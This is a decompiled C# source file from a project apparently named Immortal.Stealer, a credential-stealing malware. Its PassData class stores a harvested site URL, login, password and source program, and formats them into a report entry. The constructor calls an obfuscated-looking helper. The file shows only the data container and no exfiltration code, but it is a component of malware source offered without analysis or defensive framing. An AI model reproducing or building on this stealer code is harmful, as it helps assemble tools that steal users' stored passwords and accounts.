using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;

namespace Immortal.Stealer
{
	// Token: 0x0200000F RID: 15
	public class PassData
	{
		// Token: 0x17000008 RID: 8
		// (get) Token: 0x0600001F RID: 31 RVA: 0x00002392 File Offset: 0x00000592
		// (set) Token: 0x06000020 RID: 32 RVA: 0x0000239A File Offset: 0x0000059A
		public string Url { get; set; }

		// Token: 0x17000009 RID: 9
		// (get) Token: 0x06000021 RID: 33 RVA: 0x000023A3 File Offset: 0x000005A3
		// (set) Token: 0x06000022 RID: 34 RVA: 0x000023AB File Offset: 0x000005AB
		public string Login { get; set; }

		// Token: 0x1700000A RID: 10
		// (get) Token: 0x06000023 RID: 35 RVA: 0x000023B4 File Offset: 0x000005B4
		// (set) Token: 0x06000024 RID: 36 RVA: 0x000023BC File Offset: 0x000005BC
		public string Password { get; set; }

		// Token: 0x1700000B RID: 11
		// (get) Token: 0x06000025 RID: 37 RVA: 0x000023C5 File Offset: 0x000005C5
		// (set) Token: 0x06000026 RID: 38 RVA: 0x000023CD File Offset: 0x000005CD
		public string Program { get; set; }

		// Token: 0x06000027 RID: 39 RVA: 0x00003534 File Offset: 0x00001734
		public override string ToString()
		{
			return string.Format("SiteUrl : {0}\r\nLogin : {1}\r\nPassword : {2}\r\nProgram : {3}\r\n——————————————————————————————————", new object[]
			{
				this.Url,
				this.Login,
				this.Password,
				this.Program
			});
		}

		// Token: 0x06000028 RID: 40 RVA: 0x0000237E File Offset: 0x0000057E
		public PassData()
		{
			Class17.jLpoVv1z2TmaE();
			base..ctor();
		}

		// Token: 0x04000012 RID: 18
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private string string_0;

		// Token: 0x04000013 RID: 19
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private string string_1;

		// Token: 0x04000014 RID: 20
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private string string_2;

		// Token: 0x04000015 RID: 21
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private string string_3;
	}
}
